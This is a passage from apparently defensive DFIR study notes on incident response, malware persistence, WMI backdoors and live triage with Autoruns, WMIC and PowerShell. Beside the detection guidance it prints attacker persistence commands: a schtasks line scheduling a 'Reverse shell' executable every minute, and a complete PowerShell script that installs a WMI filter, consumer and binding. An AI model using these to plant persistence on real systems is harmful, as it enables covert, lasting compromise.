# Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis

- [Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis](#digital-forensics-and-incident-response-dfir-threat-hunting-and-malware-analysis)
- [(1) Incident Response](#1-incident-response)
  - [Incident Response Process](#incident-response-process)
  - [Dynamic Approach to Incident Response](#dynamic-approach-to-incident-response)
  - [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
  - [Attack Lifecycle](#attack-lifecycle)
  - [Malware Persitence Locations](#malware-persitence-locations)
    - [Common Autostart Locations](#common-autostart-locations)
  - [Common Malware Names](#common-malware-names)
  - [Living of the Land Binaries](#living-of-the-land-binaries)
    - [Services](#services)
    - [Scheduled Tasks](#scheduled-tasks)
    - [DLL Hijacking](#dll-hijacking)
    - [Hunting DLL Hijacking](#hunting-dll-hijacking)
    - [How WMI Works](#how-wmi-works)
      - [WMI CommandLineEventConsumers](#wmi-commandlineeventconsumers)
        - [WMI ActiveScriptEventConsumers](#wmi-activescripteventconsumers)
    - [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
    - [Hunting WMI Persistence](#hunting-wmi-persistence)
    - [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
  - [IR Scripting](#ir-scripting)
    - [IR Using WMIC](#ir-using-wmic)
    - [IR Using PowerShell](#ir-using-powershell)
    - [Kansa](#kansa)
  - [Kansa Data Stacking Collection and Analysis](#kansa-data-stacking-collection-and-analysis)
    - [Stacking Autoruns](#stacking-autoruns)
    - [Stacking Services](#stacking-services)
    - [Stacking WMI Filters and Consumers](#stacking-wmi-filters-and-consumers)
  - [KAPE](#kape)
  - [Velociraptor](#velociraptor)
    - [Most Common VQL Data Tranformations](#most-common-vql-data-tranformations)
    - [Essential Velociraptor Built-in Artifacts](#essential-velociraptor-built-in-artifacts)
  - [Credential Theft Detection and Response](#credential-theft-detection-and-response)
    - [Detecting Credential Harvesting](#detecting-credential-harvesting)
    - [Hashes](#hashes)
      - [Common Tools](#common-tools)
    - [Protecting Hashes](#protecting-hashes)
      - [Credential Availability Based on Admin Action](#credential-availability-based-on-admin-action)
    - [Tokens](#tokens)
      - [Token Stealing (Mimikatz)](#token-stealing-mimikatz)
      - [Common Tools](#common-tools-1)
    - [Protecting Tokens](#protecting-tokens)
    - [Cached Credentials](#cached-credentials)
      - [Common Tools](#common-tools-2)
    - [Protecting Cached Credentials](#protecting-cached-credentials)
    - [LSA Secrets](#lsa-secrets)
    - [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
      - [Common Tools](#common-tools-3)
    - [Protecting LSA Secrets](#protecting-lsa-secrets)
    - [Tickets - Kerberos](#tickets---kerberos)
      - [Common Tools](#common-tools-4)
    - [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
    - [Kerberos Attacks](#kerberos-attacks)
    - [Protecting Tickets](#protecting-tickets)
    - [NTDS.DIT](#ntdsdit)
    - [AD Enumeration](#ad-enumeration)
      - [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
      - [Common Tools](#common-tools-5)
    - [Protecting Against AD Enumeration](#protecting-against-ad-enumeration)
- [(2) Intrusion Analysis](#2-intrusion-analysis)
  - [Evidence of Execution](#evidence-of-execution)
    - [Prefetch](#prefetch)
    - [ShimCache - Application Compatibility](#shimcache---application-compatibility)
    - [Amcache.hve - Application Compatibility](#amcachehve---application-compatibility)
    - [Automating and Scaling Execution Analysis](#automating-and-scaling-execution-analysis)
  - [Event Logs Analysis](#event-logs-analysis)
    - [Event Log Summary](#event-log-summary)
    - [Event Log Collection](#event-log-collection)
    - [Location](#location)
    - [Types](#types)
    - [Profiling Account Usage](#profiling-account-usage)
    - [Brute Force Password Attack](#brute-force-password-attack)
    - [Built-In Accounts](#built-in-accounts)
    - [Tracking Administrator Account Activity](#tracking-administrator-account-activity)
    - [Auditing Account Creation](#auditing-account-creation)
    - [Remote Desktop Activity](#remote-desktop-activity)
    - [Account Logon Events](#account-logon-events)
    - [Privileged Local Account Abuse - Pass the Hash](#privileged-local-account-abuse---pass-the-hash)
    - [Account and Group Enumeration](#account-and-group-enumeration)
    - [Event Log Analysis Tools](#event-log-analysis-tools)
    - [Lateral Movement - Network Shares](#lateral-movement---network-shares)
    - [Cobalt Strike Mapping Shares](#cobalt-strike-mapping-shares)
    - [Lateral Movement - Explicit Credentials - runas](#lateral-movement---explicit-credentials---runas)
    - [Lateral Movement - Scheduled Tasks](#lateral-movement---scheduled-tasks)
    - [Suspicious Services](#suspicious-services)
    - [Event Log Clearing](#event-log-clearing)
  - [Lateral Movement Tactics](#lateral-movement-tactics)
    - [RDP - Source System Artifacts](#rdp---source-system-artifacts)
    - [RDP - Destination System Artifacts](#rdp---destination-system-artifacts)
    - [Windows Admin Shares - Source System Artifacts](#windows-admin-shares---source-system-artifacts)
    - [Windows Admin Shares -  Destination System Artifacts](#windows-admin-shares----destination-system-artifacts)
    - [PsExec - Source System Artifacts](#psexec---source-system-artifacts)
    - [PsExec - Destination System Artifacts](#psexec---destination-system-artifacts)
    - [Windows Remote Management Tools](#windows-remote-management-tools)
    - [Remote Services - Source System Artifacts](#remote-services---source-system-artifacts)
    - [Remote Services - Destination System Artifacts](#remote-services---destination-system-artifacts)
    - [Scheduled Tasks - Source System Artifacts](#scheduled-tasks---source-system-artifacts)
    - [Scheduled Tasks - Destination System Artifacts](#scheduled-tasks---destination-system-artifacts)
    - [WMI - Source System Artifacts](#wmi---source-system-artifacts)
    - [WMI - Destination System Artifacts](#wmi---destination-system-artifacts)
    - [Powershell Remoting - Source Sytem Artifacts](#powershell-remoting---source-sytem-artifacts)
    - [Powershell Remoting - Destination Sytem Artifacts](#powershell-remoting---destination-sytem-artifacts)
    - [Application Deployment Software](#application-deployment-software)
    - [Vulnerability Exploitation](#vulnerability-exploitation)
  - [Commandline, PowerShell and WMI Analysis](#commandline-powershell-and-wmi-analysis)
    - [Evidence of Malware Execution](#evidence-of-malware-execution)
    - [Process Tracking and Capturing Command Lines](#process-tracking-and-capturing-command-lines)
    - [WMI](#wmi)
    - [Auditing WMI Peristence](#auditing-wmi-peristence)
    - [Quick Wins - WMI-Activity/Operational Log](#quick-wins---wmi-activityoperational-log)
    - [PowerShell Logging](#powershell-logging)
    - [Quick Wins - PowerShell](#quick-wins---powershell)
    - [PowerShell Transcript Logs](#powershell-transcript-logs)
    - [PSReadline](#psreadline)
    - [System Monitor (Sysmon) Logging](#system-monitor-sysmon-logging)
- [(3) Memory Forensics](#3-memory-forensics)
  - [Acquiring Memory](#acquiring-memory)
    - [Live System](#live-system)
    - [Dead System](#dead-system)
    - [Hiberfil.sys](#hiberfilsys)
    - [Virtual Machine Machines](#virtual-machine-machines)
  - [Memory Forensic Process](#memory-forensic-process)
  - [Memory Analysis](#memory-analysis)
  - [Volatility](#volatility)
    - [Image Identification](#image-identification)
  - [Steps to Finding Evil](#steps-to-finding-evil)
  - [Identify Rogue Processes - Step 1](#identify-rogue-processes---step-1)
    - [Procces Analysis](#procces-analysis)
    - [Pslist](#pslist)
    - [Psscan](#psscan)
    - [Pstree](#pstree)
    - [Automating Analysis with Baseline](#automating-analysis-with-baseline)
    - [Rogue Processes Review](#rogue-processes-review)
  - [Memory Forensics - Master Process](#memory-forensics---master-process)
  - [Analyze Process Objects - Step 2](#analyze-process-objects---step-2)
    - [Object Analysis Plugins](#object-analysis-plugins)
    - [dlllist](#dlllist)
    - [getsids](#getsids)
    - [handles](#handles)
    - [Analyzing Process Objects Review](#analyzing-process-objects-review)
  - [Network Artifacts - Step 3](#network-artifacts---step-3)
    - [Plugins](#plugins)
    - [netstat](#netstat)
  - [Evidence of Code Injection - Step 4](#evidence-of-code-injection---step-4)
    - [Code Injection](#code-injection)
    - [Process Hollowing](#process-hollowing)
    - [Simple DLL Injection Explained](#simple-dll-injection-explained)
    - [Code Injection Plugins](#code-injection-plugins)
    - [ldrmodules](#ldrmodules)
      - [windows.ldrmodules (Process Environment Block)](#windowsldrmodules-process-environment-block)
    - [Reflective Injection](#reflective-injection)
      - [Reflective Code Injection Explained](#reflective-code-injection-explained)
    - [malfind](#malfind)
    - [malfind Countermeasures](#malfind-countermeasures)
    - [Process Memory Explained](#process-memory-explained)
      - [*Private Memory*](#private-memory)
      - [*Shareable Memory*](#shareable-memory)
      - [*Image Mapped Memory*](#image-mapped-memory)
      - [MemProcFS: FindEvil Detections](#memprocfs-findevil-detections)
      - [*Process Irregularities*](#process-irregularities)
      - [*Unusual Memory Pages*](#unusual-memory-pages)
      - [*Flags of Interest*](#flags-of-interest)
  - [Hooking and Rootkit Detection - Step 5](#hooking-and-rootkit-detection---step-5)
    - [Rootkit Hooking](#rootkit-hooking)
    - [Plugins](#plugins-1)
    - [ssdt](#ssdt)
    - [Direct Kernel Object Manipulation](#direct-kernel-object-manipulation)
    - [psxview](#psxview)
    - [modscan and modules](#modscan-and-modules)
    - [apihooks - Inline DLL Hooking](#apihooks---inline-dll-hooking)
    - [Trampoline Hooking](#trampoline-hooking)
  - [Dump Suspicious Processes and Drivers - Step 6](#dump-suspicious-processes-and-drivers---step-6)
    - [Plugins](#plugins-2)
    - [dlldump](#dlldump)
    - [moddump](#moddump)
    - [procdump](#procdump)
    - [memdump](#memdump)
    - [strings](#strings)
    - [grep](#grep)
    - [cmdscan and consoles](#cmdscan-and-consoles)
    - [Windows 10 Memory Compression](#windows-10-memory-compression)
    - [dumpfiles](#dumpfiles)
    - [filescan](#filescan)
    - [Registry Artifacts - shimcachemem](#registry-artifacts---shimcachemem)
    - [Extracted File Analysis](#extracted-file-analysis)
    - [Live Analysis](#live-analysis)
  - [Windows Forensics](#windows-forensics)
  - [Registy Overview](#registy-overview)
  - [Users and Groups](#users-and-groups)
  - [System Configuration](#system-configuration)
  - [Memory Forensics at Scale](#memory-forensics-at-scale)
  - [Scaling Analysis Using IOCs](#scaling-analysis-using-iocs)
- [(4) Timeline Analysis](#4-timeline-analysis)
  - [Malware Discovery (Field Triage)](#malware-discovery-field-triage)
    - [TOOL: Sigcheck](#tool-sigcheck)
      - [Usage](#usage)
    - [TOOL: YARA](#tool-yara)
      - [Usage](#usage-1)
        - [1. Download YARA Rules Package](#1-download-yara-rules-package)
        - [2. Compile Rules](#2-compile-rules)
        - [3. Scan Targets](#3-scan-targets)
    - [TOOL: maldump](#tool-maldump)
      - [Usage](#usage-2)
    - [TOOL: capa](#tool-capa)
      - [Usage](#usage-3)
  - [Timeline Analysis Overview](#timeline-analysis-overview)
    - [Windows Artifacts](#windows-artifacts)
    - [Timeline Analytic Process](#timeline-analytic-process)
    - [The Pivot Point](#the-pivot-point)
    - [Timeline Capabilities](#timeline-capabilities)
  - [Filesystem Timeline Creation and Analysis](#filesystem-timeline-creation-and-analysis)
    - [NTFS Timestamps](#ntfs-timestamps)
    - [Windows Time Rules](#windows-time-rules)
      - [Windows 10 Time Rules](#windows-10-time-rules)
      - [Windows 11 Time Rules](#windows-11-time-rules)
    - [Timestamp Rules Exceptions](#timestamp-rules-exceptions)
    - [Understanding Timestamps - Lateral Movement Analysis](#understanding-timestamps---lateral-movement-analysis)
    - [Filesystem Timeline Format](#filesystem-timeline-format)
    - [Create Triage Timeline Bodyfile Step 1 - MFTECmd.exe](#create-triage-timeline-bodyfile-step-1---mftecmdexe)
      - [TOOL: MFTECmd.exe](#tool-mftecmdexe)
      - [Usage](#usage-4)
    - [Create Triage Timeline Body File Step 1 - fls (optional)](#create-triage-timeline-body-file-step-1---fls-optional)
      - [TOOL: fls -m](#tool-fls--m)
      - [Usage](#usage-5)
    - [Create Triage Image Timeline Step 2 - mactime](#create-triage-image-timeline-step-2---mactime)
  - [Super Timelines](#super-timelines)
    - [Process](#process)
  - [TOOL: log2timeline](#tool-log2timeline)
    - [Usage](#usage-6)
  - [Target Examples](#target-examples)
  - [Targeted Super Timeline Creation](#targeted-super-timeline-creation)
    - [`log2timeline.py` Parser Presets](#log2timelinepy-parser-presets)
    - [`log2timeline.py` Filter Files](#log2timelinepy-filter-files)
  - [Essential Artifact List for Fast Forensics/Triage Extraction](#essential-artifact-list-for-fast-forensicstriage-extraction)
    - [`log2timeline.py` + KAPE Triage Collection](#log2timelinepy--kape-triage-collection)
    - [Filtering Super Timelines](#filtering-super-timelines)
      - [1. `pinfo.py`](#1-pinfopy)
      - [2. `psort.py`](#2-psortpy)
        - [General Format](#general-format)
        - [Time Slice Format](#time-slice-format)
      - [METHOD OF ATTACK: Partial Disk Super Timeline Creation](#method-of-attack-partial-disk-super-timeline-creation)
      - [METHOD OF ATTACK: Full Disk Super Timeline Creation](#method-of-attack-full-disk-super-timeline-creation)
    - [Timeline Analysis Tips and Tricks](#timeline-analysis-tips-and-tricks)
      - [Timeline Analysis Process](#timeline-analysis-process)
      - [Timeline Explorer Hot Keys](#timeline-explorer-hot-keys)
      - [Timeline Explorer Shortcuts](#timeline-explorer-shortcuts)
      - [Most Essential Super Timeine Columns](#most-essential-super-timeine-columns)
      - [Timeline Explorer Color Legend](#timeline-explorer-color-legend)
    - [Triage Timeline Creation](#triage-timeline-creation)
      - [0. KAPE Artifact Extraction](#0-kape-artifact-extraction)
      - [1. Creating Bodyfile](#1-creating-bodyfile)
      - [2. Enrich Bodyfile with mactime and convert into .csv](#2-enrich-bodyfile-with-mactime-and-convert-into-csv)
      - [3. Tune out unnecessary noise](#3-tune-out-unnecessary-noise)
    - [Super Timeline Creation - Partial Disk Analysis](#super-timeline-creation---partial-disk-analysis)
      - [1. List Timezones](#1-list-timezones)
      - [2. Timeline Windows artifacts](#2-timeline-windows-artifacts)
      - [3. Add Master File Table](#3-add-master-file-table)
      - [4. Convert Super Timeline to CSV and Filter](#4-convert-super-timeline-to-csv-and-filter)
    - [Super Timeline Creation - Full Disk Analysis](#super-timeline-creation---full-disk-analysis)
      - [1. List Timezones](#1-list-timezones-1)
      - [2. Parse Full Triage Image](#2-parse-full-triage-image)
      - [3. Add full MFT Metadata (Bodyfile for Timeline)](#3-add-full-mft-metadata-bodyfile-for-timeline)
      - [4. Convert Super Timeline to CSV and Filter](#4-convert-super-timeline-to-csv-and-filter-1)
  - [Scaling Timeline Analysis](#scaling-timeline-analysis)
    - [Timesketch](#timesketch)
    - [yara\_match.py](#yara_matchpy)
  - [Supertimeline Analytic Process](#supertimeline-analytic-process)
    - [Sanity Check Questions - REVIEW AND UPDATE](#sanity-check-questions---review-and-update)
    - [Filtering Tips and Tricks - REVIEW AND UPDATE](#filtering-tips-and-tricks---review-and-update)
- [(5) Anti-Forensics Detection](#5-anti-forensics-detection)
  - [Overview](#overview)
    - [Filesystem](#filesystem)
    - [Registry](#registry)
    - [Other](#other)
  - [Recovery of Deleted Files via VSS](#recovery-of-deleted-files-via-vss)
    - [Volume Shadow Copies](#volume-shadow-copies)
    - [Volume Shadow Examination](#volume-shadow-examination)
    - [Mount and Serach All Shadow Copies](#mount-and-serach-all-shadow-copies)
    - [VSS Examination with `log2timeline.py`](#vss-examination-with-log2timelinepy)
    - [VSS Super Timeline Creation (SEE LAB 5.1/5.2)](#vss-super-timeline-creation-see-lab-5152)
  - [Advanced NTFS Filesystem Tactics](#advanced-ntfs-filesystem-tactics)
    - [Master File Table - MFT](#master-file-table---mft)
    - [MFT Entry Allocated](#mft-entry-allocated)
    - [MFT Entry Unallocated](#mft-entry-unallocated)
    - [Sequential MFT Entries (Lethal DFIR Technique 🎯)](#sequential-mft-entries-lethal-dfir-technique-)
    - [Most Common MFT Entry Attributes within NTFS](#most-common-mft-entry-attributes-within-ntfs)
      - [Attribute Types: FILES](#attribute-types-files)
      - [Attribute Types: DIRECTORIES](#attribute-types-directories)
    - [MFT Entry Hex Overview](#mft-entry-hex-overview)
    - [istat - Analyzing File System Metadata](#istat---analyzing-file-system-metadata)
    - [Detecting Timestamp Manipulation (Lethal DFIR Technique 🎯)](#detecting-timestamp-manipulation-lethal-dfir-technique-)
    - [Timestomp Detection Analysis Process (Lethal Technique DFIR 🎯)](#timestomp-detection-analysis-process-lethal-technique-dfir-)
    - [Analyzing $DATA](#analyzing-data)
    - [Extracting Data with The Sleuth Kit - `icat`](#extracting-data-with-the-sleuth-kit---icat)
    - [The Zone Identifier ADS -  Evidence of Download (Lethal DFIR Technique 🎯)](#the-zone-identifier-ads----evidence-of-download-lethal-dfir-technique-)
      - [Linux Live System](#linux-live-system)
      - [Windows Live System](#windows-live-system)
    - [Filename Layer Analysis (Lethal DFIR Technique 🎯)](#filename-layer-analysis-lethal-dfir-technique-)
      - [NTFS (New Technology File System) Directory Attributes](#ntfs-new-technology-file-system-directory-attributes)
      - [Parsing `$I30` Directory Indexes (Lethal DFIR Technique 🎯)](#parsing-i30-directory-indexes-lethal-dfir-technique-)
    - [File System Jounraling Overview](#file-system-jounraling-overview)
    - [$LogFile Provides File System Resilience](#logfile-provides-file-system-resilience)
    - [UsnJrnl](#usnjrnl)
    - [Common Activity Patterns in the Journals](#common-activity-patterns-in-the-journals)
      - [$USN Journal Reason Codes](#usn-journal-reason-codes)
      - [$LogFile Operation Codes](#logfile-operation-codes)
    - [Useful Filter and Searches in the Journals](#useful-filter-and-searches-in-the-journals)
    - [LogFileParser for $LogFile Analysis (Lethal DFIR Technique 🎯)](#logfileparser-for-logfile-analysis-lethal-dfir-technique-)
    - [MFTECmd for $UsnJrnl Analysis (Lethal DFIR Technique 🎯)](#mftecmd-for-usnjrnl-analysis-lethal-dfir-technique-)
      - [Tips, Tricks, and Analysis](#tips-tricks-and-analysis)
        - [Timeline Explorer $UsnJrnl Headings:](#timeline-explorer-usnjrnl-headings)
        - [MFT Entry and Sequence Number](#mft-entry-and-sequence-number)
        - [Tracking Files With No Apparent Creating Time](#tracking-files-with-no-apparent-creating-time)
        - [Searching Sub-directories Within `Parent Entry Number`](#searching-sub-directories-within-parent-entry-number)
    - [NTFS: What Happens When a File is Deleted?](#ntfs-what-happens-when-a-file-is-deleted)
  - [Advanced Evidence Recovery](#advanced-evidence-recovery)
    - [SDelete](#sdelete)
    - [BCWiper](#bcwiper)
    - [Eraser](#eraser)
    - [Cipher](#cipher)
    - [Registry Key/Value "Records" Recovery](#registry-keyvalue-records-recovery)
    - [Finding Fileless Malware in the Registry](#finding-fileless-malware-in-the-registry)
    - [File Recovery](#file-recovery)
    - [File Recovery via Metadata Method](#file-recovery-via-metadata-method)
    - [File Recovery via Carving Method](#file-recovery-via-carving-method)
    - [Recovering Deleted Volume Shadow Copy Snapshots](#recovering-deleted-volume-shadow-copy-snapshots)
    - [Stream Carving for Event Log and File System Records](#stream-carving-for-event-log-and-file-system-records)
    - [Carving for Strings](#carving-for-strings)
  - [Defensive Coutermeasures](#defensive-coutermeasures)
    - [Leverage File System History](#leverage-file-system-history)
    - [Level Up on Visibility](#level-up-on-visibility)

---

# (1) Incident Response

## Incident Response Process
1. Preparation
	* Creating a response capability
	* Testing response capabilites
	* Securing Systems
	* Changes to response capabilties from lessons learned
2. Identification and Scoping
	* Alert from security tools
	* Result of threat hunting
	* Notification from user
	* Hunt for additional compromise
3. Containment/Intelligence Development
	* Identify vulnerabilities or exploits
	* Persistence Techniques
	* Lateral Movement
	* Command and Control
	* IOC developement
	* Mitigative actions to slow attacker
4. Eradication/Remediation
	* Block IPs and Domains
	* Restore systems
	* Password changes
	* Vulnerability patching
	* Prevent further adversarial access
	* Remove adversarial presence
5. Recovery
	* Improve logging (SIEM)
	* Cybersecurity Awareness
	* Segmentation
	* Password policies
	* Vulnerability management
	* Network/Endpoint visibility
6. Lessons Learned/Threat Intel Consumption
	* Verify remediations
	* Penetration tests
	* Information sharing
	* Compliance verification

## Dynamic Approach to Incident Response
![DAIR Framework](<files/DAIR Framework.png>)

## Incident Response Hierarchy of Needs
<img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />

[Ref: Matt Swann](https://github.com/swannman/ircapabilities)

## Attack Lifecycle
<img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />




## Malware Persitence Locations

* Malware needs  to hide, but it also must survive!  
* Where is the adversary likely to go and beat them to that location? Sit, wait, and watch\!

* Most common areas of persistence (~98% of all persistence is captured in the first 6 steps)  
  * AutoStart Locations  
  * Service Creation/Replacement  
  * Service Failure Recovery  
  * Scheduled Tasks  
  * DLL Hijacking  
  * WMI Event Consumers  
  * More Advanced and Rare (Group Policy, MS Office Add-In, BIOS Flashing)

* [Sysinternals Tools](https://live.sysinternals.com/)

* [Sysinternals Info](https://learn.microsoft.com/en-us/sysinternals/?source=recommendations)

* Sysinternals – autorunsc.exe  
  * Detection of AutoStart, Service Creation/Replacement, Scheduled Tasks, WMI Event Consumers

 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```

### Common Autostart Locations
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

## Common Malware Names
* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)



## Living of the Land Binaries
* [LOLBAS Project](https://lolbas-project.github.io/)  

**RUNONCE.EXE**
- Executes a Run Once Task that has been configured in the registry
```
Runonce.exe /AlternateShellStartup
```

**RUNDLL32.EXE**
- Used by Windows to execute dll files
```
rundll32.exe AllTheThingsx64,EntryPoint
```

**WMIC.EXE**
- The WMI command-line (WMIC) utility provides a command-line interface for WMI
```
wmic.exe process call create calc
```

**NETSH.EXE**
- Netsh is a Windows tool used to manipulate network interface settings.
```
netsh.exe add helper C:\Users\User\file.dll
```

**SCHTASKS.EXE**
- Schedule periodic tasks
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

**MSIEXEC.EXE**
- Used by Windows to execute msi files
```
msiexec /quiet /i cmd.msi
```

**Tools**
* Autoruns
* Kansa



### Services
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services

**Tools**
* Autoruns
* "sc" command
* Kansa



### Scheduled Tasks
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Tools:
- Autoruns
- Kansa



### DLL Hijacking

DLL Search Order Hijacking
- Place malicious file ahead of DLL in search order
- Windows looks at Application directory prior to Windows/System32 folder
- Look at exe's import table
- Exception: DLLs present in the KnownDLLs Registry Key

Phantom DLL Hijacking
- Find DLLs that applications attempt to load, but doesn't exist

DLL Side Loading
- WinSXS provides a new version of a legit DLL

Relative Path DLL Hijacking
- Copy target .exe and corresponding bad .dll to a different location

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%



### Hunting DLL Hijacking
- Machines rarely get new dlls (Application Install/Patching)

File system analysis
- Look for new or unsigned .exe/.dll files in unusual places

Memory Analysis
- Find system process or DLLs loaded from the wrong location

This technique is often followed up C2 network beaconing

### How WMI Works

WMI Event Filter **“IF Statement”**

* Specific **filters**, **requirements**, or **conditions** that must be met in order for the consumer to initiate.

WMI Event Consumers **“THEN Statement”**

* The CommandLine or ActiveScript that is executed once the initial conditions from Filtering are met.

The **Filter** is the *if* statement: *"If this specific event happens..."*  
The **Consumer** is the *then* statement: *"Then execute this action."*

#### WMI CommandLineEventConsumers

* More versatile since it runs single commands or chains of commands.  
* Commonly used for reconnaissance (like running ipconfig, whoami, or net user) or triggering tools already present on the target (like net.exe, powershell.exe, or custom binaries).  
* Simpler than ActiveScript but equally dangerous when combined with the right WMI filter.

```
wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="MaliciousConsumer" CommandLineTemplate="cmd.exe /c calc.exe"
```

##### WMI ActiveScriptEventConsumers

* Focused on full script execution.  
* Scripts are typically VBScript or JScript, often stored or embedded directly in the consumer.  
* Used for persistence or more complex tasks (e.g., downloading additional payloads, altering system configs).  
* Artifacts like temp directories, startup folders, or unusual scripts in AppData often hint at misuse.

```
$FilterName = "MaliciousFilter"
$ConsumerName = "MaliciousConsumer"
$Script = "Set WshShell = CreateObject('WScript.Shell') : WshShell.Run('cmd.exe /c calc.exe')"

# Define the event filter
$Filter = ([WMIClass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.Name = $FilterName
$Filter.QueryLanguage = "WQL"
$Filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
$Filter.Put()

# Define the ActiveScript consumer
$Consumer = ([WMIClass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
$Consumer.Name = $ConsumerName
$Consumer.ScriptingEngine = "VBScript"
$Consumer.ScriptText = $Script
$Consumer.Put()

# Bind the filter to the consumer
$Binding = ([WMIClass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $Filter.__PATH
$Binding.Consumer = $Consumer.__PATH
$Binding.Put()
```

**Filter Creation:**

* The $Filter object is created from the \_\_EventFilter class.  
* $FilterName is used as the filter's name, and a WQL query specifies what events the filter will match.

**Consumer Creation:**

* The $Consumer object is created from the ActiveScriptEventConsumer class.  
* $ConsumerName is used to name the consumer.  
* The $Script variable provides the malicious payload (e.g., running calc.exe).

**Binding:**

* The __FilterToConsumerBinding object binds the filter `($Filter)` to the consumer `($Consumer)` using their paths.

### WMI Event Consumer Backdoors
- Allows triggers to be set that will run scripts and executables
- Event Filter: Trigger Condition
- Event Consumer: Script or executable to run
- Binding: Combine Filter and Consumer

Tools
- Kansa
- Autoruns

Discover Suspicious WMI Events
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```


### Hunting WMI Persistence
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)



### Hunt and Analyze Persistence with Autoruns
- Live System Only
- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
- Hashes files and can search VirusTotal for hits

1. Run autorunsc
 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```
2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
3. Filter out trusted startup locations
	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
	- Look for:
		- (Not Verified)
		- Unfamiliar Signers
		- Blank (No Signer)
4. Filter by Enabled (Active)
5. Compare hashes to VirusTotal
6. Research vendor and product listed in "Publisher" and "Description" fields
7. Compare output to a the output of a known good machine

---

## IR Scripting

### IR Using WMIC
- [Running WMI Scripts Against Multiple Computers](https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee692838(v=technet.10))
- [WMIC for incident response](https://www.sans.org/blog/wmic-for-incident-response/)
- [Like a Kid in a WMIC Candy Store](https://isc.sans.edu/diary/Tip+of+the+Day+-+Like+a+Kid+in+a+WMIC+Candy+Store/1622)
- [PoSh-R2](https://github.com/WiredPulse/PoSh-R2)

Examples
```
/node:<remote-IP> | /user:<admin acct>
```
Get Auto-Start Process
```
wmic /node:10.1.1.1 startup list full
```
Remote Process List
```
wmic /node:10.1.1.1 process get
```
Network Configuration
```
wmic /node:10.1.1.1 nicconfig get
```




### IR Using PowerShell
- [Live Response Using PowerShell](https://www.sans.org/white-papers/34302/)
- [Powershell: Forensic One-liners](https://www.ldap389.info/en/2013/06/17/powershell-forensic-onliners-regex-get-eventlog/)
- [Weekend Scripter: Using PowerShell to Aid in Security Forensics](https://devblogs.microsoft.com/scripting/weekend-scripter-using-powershell-to-aid-in-security-forensics/)
- [Use PowerShell to Perform Offline Analysis of Security Logs](https://devblogs.microsoft.com/scripting/use-powershell-to-perform-offline-analysis-of-security-logs/)
- [Learn the Easy Way to Use PowerShell to Get File Hashes](https://devblogs.microsoft.com/scripting/learn-the-easy-way-to-use-powershell-to-get-file-hashes/)
- [Use PowerShell to Compute MD5 Hashes and Find Changed Files](https://devblogs.microsoft.com/scripting/use-powershell-to-compute-md5-hashes-and-find-changed-files/)

Remoting
```powershell
Enter-PSSession computername
Invoke-Command -ScriptBlock -Filepath -AsJob
```
- [The Power of PowerShell Remoting](https://www.sans.org/blog/the-power-of-powershell-remoting/)
- [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.1)
- [PowerShell Remoting Performance](https://www.hofferle.com/powershell-remoting-performance/)

Authentication
- Non-interactive (Type 3) logon
- Does not cache creds
- Creds not passed to remote system (Mimikatz, Incognito)




### Kansa
**Collection**
